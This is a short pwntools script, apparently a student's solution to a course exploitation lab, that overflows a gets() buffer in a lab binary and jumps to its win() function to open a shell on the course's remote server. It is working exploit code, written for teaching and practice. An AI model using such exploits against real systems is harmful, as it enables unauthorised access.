from pwn import *

if __name__ == "__main__":

    # Declaring some variables that will be used later.
    local_binary_file = "./lab2-1.bin"
    remote_server = "csc748.hostbin.org"
    remote_port = 7021

    #### PREPARATION ####

    # Considering the similarity of this lab to lab1-2, I'm reusing a lot of my code.
    # After looking at the lab2-1.c file, I noticed the "void win()" function.
    # This function again calls "/bin/bash", allowing me to drop into a shell.

    # In the "int main()" function, gets is called.
    # This should allow me to jump to the win() function through a buffer overflow.

    # First, I need to get the address of the win() function.
    # I load the binary as an ELF file to analyse the symbols.
    victim_binary = ELF(local_binary_file)

    # Then, I search for and capture the address.
    win_function_address = victim_binary.symbols["win"]

    #### EXPLOITATION ####
    
    # I can now run the process. The following lines are various forms for different purposes.
    process_to_exploit = remote(remote_server, remote_port)
    # process_to_exploit = process(local_binary_file)
    # process_to_exploit = gdb.debug(local_binary_file)

    # To overflow the buffer, I prepare to send 64+8 bytes.
    buffer_overflower = b"0"*72

    # I also prepare to put the address of the win() function on the stack.
    instruction_redirect = p64(win_function_address)

    process_to_exploit.sendline(buffer_overflower + instruction_redirect)

    # Now I can drop into a shell.
    process_to_exploit.interactive()